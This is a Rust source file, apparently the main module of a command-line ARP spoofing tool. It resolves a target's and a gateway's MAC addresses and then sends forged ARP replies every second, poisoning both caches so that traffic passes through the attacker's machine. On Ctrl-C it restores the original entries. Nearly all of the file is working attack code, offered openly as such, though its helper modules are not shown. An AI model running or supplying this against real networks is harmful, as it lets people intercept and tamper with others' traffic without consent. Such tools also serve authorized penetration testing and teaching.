extern crate pnet;
extern crate pnet_datalink;
extern crate clap;
extern crate indicatif;
extern crate console;
extern crate ctrlc;
extern crate atomic_enum;
extern crate anyhow;

use std::process;
use std::{thread, time};
use std::net::Ipv4Addr;
use std::sync::atomic::Ordering;
use pnet_datalink::NetworkInterface;
use atomic_enum::atomic_enum;

mod opts;
mod arp;
mod net;
mod logs;

// Declaration of the `getuid` function.
#[link(name = "c")]
extern "C" {
  fn getuid() -> u32;
}

/// Declaration of the `AttackState` type
/// which defines the state in which the attack
/// currently is.
#[atomic_enum]
#[derive(PartialEq)]
enum AttackState {
  Stopped = 0,
  CleanUp = 1,
  Running = 2
}

/// Static declaration of the current attack state.
static ATTACK_STATE: AtomicAttackState = AtomicAttackState::new(AttackState::Stopped);

/// Triggers the resolution of the MAC address associated
/// with a remote host IP address.
/// Returns the MAC address associated with the remote host,
/// panics otherwise.
/// 
/// # Arguments
/// 
/// * `iface` the network interface to send ARP packets through.
/// * `gateway_ip` the IP address of the network gateway.
///
fn resolve_arp_host(
  iface: &NetworkInterface,
  host_type: logs::resolution::HostType,
  host_ip: Ipv4Addr
) -> arp::ArpHost {
  logs::resolution::search(host_type, host_ip);
  let gateway = arp::resolve_arp_host(iface, host_ip).unwrap();
  logs::resolution::found(gateway);
  gateway
}

/// Runs a synchronous loop that will send ARP packets
/// to poison the ARP cache of the target and the gateway.
/// 
/// # Arguments
/// 
/// * `iface` the network interface to run the attack through.
/// * `target` the target host information.
/// * `gateway` the gateway host information.
/// 
fn run_arp_poisonning_attack(
  iface: &NetworkInterface,
  target: &arp::ArpHost,
  gateway: &arp::ArpHost
) {
  // Resolving the network interface MAC address.
  let local_mac = iface.mac.unwrap();

  logs::poisoning::state(logs::poisoning::State::InProgress);
  ATTACK_STATE.store(AttackState::Running, Ordering::Relaxed);
  loop {
    // Poisonning the cache of the target.
    arp::send_arp_reply(
      iface,
      arp::ArpHost { ip: gateway.ip, mac: local_mac },
      arp::ArpHost { ip: target.ip, mac: target.mac }
    )
    .unwrap()
    .expect("Could not send ARP packet");

    // Poisonning the cache of the gateway.
    arp::send_arp_reply(
      iface,
      arp::ArpHost { ip: target.ip, mac: local_mac },
      arp::ArpHost { ip: gateway.ip, mac: gateway.mac }
    )
    .unwrap()
    .expect("Could not send ARP packet");
    
    if ATTACK_STATE.load(Ordering::Relaxed) != AttackState::Running {
      break;
    }
    thread::sleep(time::Duration::from_secs(1));
  }
}

/// Attempts to restore the target and gateway ARP caches
/// to their initial values.
/// 
/// # Arguments
/// 
/// * `iface` the network interface to run the attack through.
/// * `target` the target host information.
/// * `gateway` the gateway host information.
/// 
fn run_arp_cleanup(
  iface: &NetworkInterface,
  target: &arp::ArpHost,
  gateway: &arp::ArpHost
) {
  logs::poisoning::state(logs::poisoning::State::CleanUp);
  for _ in 1..10 {
    // Restoring the cache of the target.
    arp::send_arp_reply(
      iface,
      arp::ArpHost { ip: gateway.ip, mac: gateway.mac },
      arp::ArpHost { ip: target.ip, mac: target.mac }
    )
    .unwrap()
    .expect("Could not send ARP packet");

    // Restoring the cache of the gateway.
    arp::send_arp_reply(
      iface,
      arp::ArpHost { ip: target.ip, mac: target.mac },
      arp::ArpHost { ip: gateway.ip, mac: gateway.mac }
    )
    .unwrap()
    .expect("Could not send ARP packet");
    
    thread::sleep(time::Duration::from_millis(500));
  }
}

fn main() {
  unsafe {
    if getuid() != 0 {
      panic!("This tool requires root privileges");
    }
  }

  // Registering a handler on a Ctrl-c that will
  // stop the attack.
  ctrlc::set_handler(move || {
    match ATTACK_STATE.load(Ordering::Relaxed) {
      AttackState::Stopped => process::exit(1),
      AttackState::Running => ATTACK_STATE.store(
        AttackState::CleanUp,
        Ordering::Relaxed
      ),
      AttackState::CleanUp => process::exit(1)
    }
  }).expect("Error setting Ctrl-C handler");

  let matches: clap::ArgMatches = opts::get_matches();
  // The given interface name.
  let interface_name: &String = matches
    .get_one::<String>("interface")
    .unwrap();
  // Parsing the target IP address.
  let target_ip: Ipv4Addr = matches
    .get_one::<String>("target")
    .unwrap()
    .parse()
    .expect("The target must be a valid IPv4 address");
  // Parsing the gateway IP address.
  let gateway_ip: Ipv4Addr = matches
    .get_one::<String>("gateway")
    .unwrap()
    .parse()
    .expect("The gateway must be a valid IPv4 address");
  // Resolving the network interface associated to the given name.
  let iface = net::find_network_interface(interface_name).unwrap();

  // Verifying whether the IP address is not the local IP address.
  match net::get_ipv4_addr_of(&iface) {
    Some(x) => if x == target_ip { panic!("Cannot use local ip as target ip"); },
    None => panic!("Could not resolve local IPv4 address")
  };
  
  // Resolving the MAC address of the target IP address.
  let target = resolve_arp_host(&iface, logs::resolution::HostType::Target, target_ip);

  // Resolving the MAC address of the gateway IP address.
  let gateway = resolve_arp_host(&iface, logs::resolution::HostType::Gateway, gateway_ip);
  
  // Running the attack.
  run_arp_poisonning_attack(&iface, &target, &gateway);

  // Cleaning up the remote ARP cache.
  run_arp_cleanup(&iface, &target, &gateway);

  logs::poisoning::state(logs::poisoning::State::Stopped);
}